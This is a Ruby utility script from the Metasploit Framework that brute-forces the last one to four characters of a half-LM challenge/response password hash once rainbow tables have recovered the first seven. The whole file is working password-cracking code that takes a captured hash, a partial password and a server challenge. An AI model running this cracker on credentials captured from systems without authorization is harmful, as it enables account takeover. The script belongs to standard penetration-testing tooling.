#!/usr/bin/env ruby

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# This script cracks a half-lm challenge/response hash that uses a
# a static challenge key. The idea is you use rainbow tables to
# crack the first 7 chars and this script to complete a few remaining.
# If the password is longer than 10 characters, this script will fail.
#

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end

$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', 'lib')))
require 'msfenv'

$:.unshift(ENV['MSF_LOCAL_LIB']) if ENV['MSF_LOCAL_LIB']
require 'rex'

def usage
  $stderr.puts("\n" + "    Usage: #{$0} <options>\n" + $args.usage)
  exit
end

def try(word,challenge)
  buf = ::Rex::Proto::NTLM::Crypt.lanman_des(word, challenge)
  buf.unpack("H*")[0]
end

hash = pass = chall = nil

$args = Rex::Parser::Arguments.new(
  "-n" => [ true,  "The encypted LM hash to crack"                                    ],
  "-p" => [ true,  "The decrypted LANMAN password for bytes 1-7"                      ],
  "-s" => [ true,  "The server challenge (default value 1122334455667788)"            ],
  "-h" => [ false, "Display this help information"                                      ])

$args.parse(ARGV) { |opt, idx, val|
  case opt
    when "-n"
      hash = val
    when "-p"
      pass = val
    when "-s"
      chall = val
    when "-h"
      usage
    else
      usage
  end
}

if (not (hash and pass))
  usage
end

if (not chall)
  chall = ["1122334455667788"].pack("H*")
else
  if not chall =~ /^([a-fA-F0-9]{16})$/
    $stderr.puts "[*] Server challenge must be exactly 16 bytes of hexadecimal"
    exit
  else
    chall = [chall].pack("H*")
  end
end


if(hash.length != 48)
  $stderr.puts "[*] LANMAN should be exactly 48 bytes of hexadecimal"
  exit
end

if(pass.length != 7)
  $stderr.puts "[*] Cracked LANMAN password should be exactly 7 characters"
  exit
end

pass = pass.upcase
hash = hash.downcase

cset = [*(1..255)].pack("C*").upcase.unpack("C*").uniq

stime = Time.now.to_f
puts "[*] Trying one character..."
0.upto(cset.length-1) do |c1|
  test = pass + cset[c1].chr
  if(try(test, chall) == hash)
    puts "[*] Cracked: #{test}"
    exit
  end
end
etime = Time.now.to_f - stime

puts "[*] Trying two characters (eta: #{etime * cset.length} seconds)..."
0.upto(cset.length-1) do |c1|
0.upto(cset.length-1) do |c2|
  test = pass + cset[c1].chr + cset[c2].chr
  if(try(test, chall) == hash)
    puts "[*] Cracked: #{test}"
    exit
  end
end
end

puts "[*] Trying three characters (eta: #{etime * cset.length * cset.length} seconds)..."
0.upto(cset.length-1) do |c1|
0.upto(cset.length-1) do |c2|
0.upto(cset.length-1) do |c3|
  test = pass + cset[c1].chr + cset[c2].chr + cset[c3].chr
  if(try(test, chall) == hash)
    puts "[*] Cracked: #{test}"
    exit
  end
end
end
end

puts "[*] Trying four characters (eta: #{etime * cset.length * cset.length * cset.length} seconds)..."
0.upto(cset.length-1) do |c1|
0.upto(cset.length-1) do |c2|
0.upto(cset.length-1) do |c3|
0.upto(cset.length-1) do |c4|
  test = pass + cset[c1].chr + cset[c2].chr + cset[c3].chr + cset[c4].chr
  if(try(test, chall) == hash)
    puts "[*] Cracked: #{test}"
    exit
  end
end
end
end
end
